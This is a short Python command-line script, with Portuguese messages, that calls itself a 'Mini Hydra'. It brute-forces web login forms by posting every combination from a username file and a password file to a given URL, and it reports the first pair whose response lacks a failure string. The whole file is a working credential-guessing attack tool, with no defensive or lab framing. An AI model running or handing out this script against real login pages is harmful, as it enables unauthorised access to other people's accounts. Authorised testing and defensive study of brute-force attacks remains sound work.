import requests
import argparse
import time
from itertools import product

def load_list(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def attack(url, form, fail_flag, users, passwords, delay):
    print(f"[+] Iniciando ataque contra {url}")
    print(f"[+] Falha será detectada por: '{fail_flag}'\n")

    for user, pwd in product(users, passwords):
        payload = form.replace("^USER^", user).replace("^PASS^", pwd)
        data = dict(x.split("=") for x in payload.split("&"))

        try:
            response = requests.post(url, data=data, timeout=10)
            if fail_flag not in response.text:
                print(f"[✔] Sucesso: {user}:{pwd}")
                return
            else:
                print(f"[✘] Falha: {user}:{pwd}")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Erro com {user}:{pwd} -> {e}")
    print("[✘] Nenhuma combinação válida encontrada.")

def main():
    parser = argparse.ArgumentParser(description="Mini Hydra em Python")
    parser.add_argument("-U", "--url", required=True, help="URL de login")
    parser.add_argument("-d", "--data", required=True, help="Dados do formulário, ex: uname=^USER^&pass=^PASS^")
    parser.add_argument("-f", "--fail", required=True, help="Texto que indica falha de login")
    parser.add_argument("-u", "--userfile", required=True, help="Arquivo com nomes de usuário")
    parser.add_argument("-p", "--passfile", required=True, help="Arquivo com senhas")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay entre tentativas (s)")

    args = parser.parse_args()

    users = load_list(args.userfile)
    passwords = load_list(args.passfile)

    attack(args.url, args.data, args.fail, users, passwords, args.delay)

if __name__ == "__main__":
    main()
